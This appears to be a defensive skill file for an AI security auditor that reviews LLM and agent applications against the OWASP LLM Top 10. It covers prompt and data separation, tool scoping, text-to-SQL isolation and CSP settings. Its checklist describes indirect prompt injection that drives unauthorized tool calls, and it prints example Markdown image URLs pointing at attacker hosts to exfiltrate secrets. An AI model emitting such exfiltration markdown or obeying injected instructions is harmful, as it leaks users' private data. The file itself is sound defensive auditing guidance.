---
name: viper-ai-llm-redteam
description: AI, LLM & MCP Application Security Auditor (OWASP LLM Top 10). Reviews prompt construction, RAG data boundaries, tool-call authorization, and output handling.
---

# AI, LLM & Agentic Application Security Auditor (OWASP LLM Top 10) (`viper-ai-llm-redteam`)

## 1. Executive Scope, Standards & CWE/OWASP Mapping
- **Frameworks & Standards:** OWASP Top 10 for LLM Applications (LLM01–LLM10), OWASP Agentic AI Top 10 (ASI01–ASI10), NIST AI RMF
- **Primary CWE Mapping:** CWE-77 (Command Injection via LLM Output), CWE-79 (XSS via Unsanitized Markdown), CWE-269 (Excessive Agency), CWE-200 (System Prompt / Secret Exposure)
- **ViperClaw MCP Tools:** `viper_taint_scan`, `viper_oob_probe`, `viper_verify_and_report`
- **ViperClaw CLI Command:** `viperclaw taint ./src --db .viperclaw/graph.db`

---

## 2. Threat Model & Root-Cause Architecture

```mermaid
flowchart LR
  User["User Prompt + Untrusted RAG Data"] --> LLM["LLM Reasoning Layer"] --> Schema["Deterministic Tool Policy & Schema Gate"] --> Downstream["Parameterized API / Sanitized UI"]
```

### Root-Cause Analysis
Applications treat LLM output as trusted developer instructions—passing model-generated strings directly into SQL engines (`SQLDatabaseChain`), Python/Bash executors (`PythonREPLTool`), unescaped Markdown/HTML renderers, or privileged internal APIs without caller-scoped authorization.

---

## 3. Deterministic Discovery & Grep/AST Audit Commands

Run the following discovery commands across the target repository before manual code review:

```bash
# 1. Automated ViperClaw analysis
viperclaw taint ./src --db .viperclaw/graph.db

# 2. Rapid static pattern discovery (ripgrep)
rg -n "(openai\.|anthropic\.|ChatCompletion|generate_content|LangChain|LlamaIndex)"
rg -n "(create_sql_agent|SQLDatabaseChain|PythonREPLTool|ShellTool|BashProcess)"
rg -n "(system_prompt|tools\s*=\s*\[|function_call|tool_choice)"
```

---

## 4. Senior Security Engineer 8-Point Audit Checklist

| Control ID | Audit Verification Target | Pass Criteria | Fail / Vulnerability Indicator |
| :---: | :--- | :--- | :--- |
| `LLM-01` | **Prompt & Untrusted Data Separation (LLM01)** | External content (emails, web pages, RAG documents) is wrapped in explicit structural delimiters and separated from system instructions. | Untrusted external text concatenated directly into the system prompt. |
| `LLM-02` | **Insecure Output Handling (LLM02)** | LLM output is sanitized (`DOMPurify`) before DOM rendering and never passed into `eval()`, `exec()`, or raw SQL. | Markdown output containing `<script>`, `javascript:` links, or exfiltration `![](https://attacker.tld/?q=...)` rendered raw. |
| `LLM-03` | **Excessive Agency & Tool Scoping (LLM08 / ASI03)** | LLM tools execute under the *authenticated caller's* RBAC/tenant token, never a global admin service key. | AI assistant uses a master database connection or service-role key to query tables on behalf of any user. |
| `LLM-04` | **Human-in-the-Loop (HITL) on State Changes** | Tools that send emails, transfer funds, modify permissions, or delete records require explicit user confirmation in the UI. | Indirect prompt injection in an email triggers an autonomous tool call that forwards private messages. |
| `LLM-05` | **No Secrets in System Prompts (LLM06)** | API keys, database credentials, and proprietary access logic are never placed inside system prompts. | System prompt contains hardcoded API keys or internal credentials. |
| `LLM-06` | **Text-to-SQL Read-Only & Row-Level Isolation** | Natural-language-to-SQL features use a read-only DB role (`SELECT` only) with PostgreSQL Row-Level Security (RLS) enforced. | LLM-generated SQL executed on a read-write DB connection without tenant RLS. |
| `LLM-07` | **Token Budget & Unbounded Consumption Caps (LLM04)** | Per-user rate limits, `max_tokens` caps, and maximum agent tool-loop iterations (`max_steps <= 10`) enforced. | Unbounded recursive agent loops or 10MB prompt inputs exhausting API budgets. |
| `LLM-08` | **Image & Markdown Exfiltration CSP** | Chat UI enforces a strict CSP `img-src 'self' data:` so injected Markdown images cannot exfiltrate conversation history via query strings. | LLM tricked into rendering `![x](https://external.tld/leak?data=SECRET)` which the browser auto-fetches. |

---

## 5. False-Positive Elimination & CVSS v3.1 Triage Rubric

### False-Positive Gate
1. Verify whether an upstream API Gateway, global middleware, or ORM hook already enforces the control before flagging a controller.
2. Confirm the code path is reachable from an external entrypoint (not dead code, CLI-only admin script, or unit-test fixture).

| Severity Tier | Baseline CVSS v3.1 Vector | Qualifying Security Impact |
| :--- | :--- | :--- |
| **CRITICAL (9.6)** | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` | LLM output passed to `PythonREPLTool` / `ShellTool` or raw SQL connection allowing RCE / full DB dump. |
| **HIGH (8.1)** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N` | Indirect prompt injection executing unauthorized state-changing tool calls or exfiltrating cross-tenant RAG data. |
| **MEDIUM (5.4)** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N` | Unsanitized LLM Markdown output leading to client-side XSS or external image beacon tracking. |

---

## 6. Production Remediation Patterns (Vulnerable vs. Hardened Code)

```python
# ❌ VULNERABLE: Executes LLM-generated SQL using a global admin connection without RLS
def run_ai_analytics(user_question: str) -> list:
    sql_query = llm.generate_sql(prompt=user_question)
    return admin_db.execute(sql_query).fetchall()

# ✅ HARDENED: Read-only transaction + PostgreSQL session tenant RLS binding + statement timeout
def run_ai_analytics(user_question: str, session: VerifiedSession) -> list:
    sql_query = llm.generate_sql(prompt=user_question)
    with readonly_db.transaction() as conn:
        conn.execute("SET LOCAL statement_timeout = '3000ms'")
        conn.execute("SELECT set_config('app.current_tenant_id', %s, true)", (str(session.tenant_id),))
        return conn.execute(sql_query).fetchall()
```

---

## 7. Regression Testing & Continuous Verification
1. Write a **Positive Unit Test** confirming authorized, schema-valid requests succeed.
2. Write a **Negative Security Regression Test** confirming unauthorized, cross-tenant, or malformed inputs are deterministically rejected.
3. Re-run `viperclaw taint` and `viperclaw verify` to confirm zero remaining unmitigated flows in `.viperclaw/graph.db`.
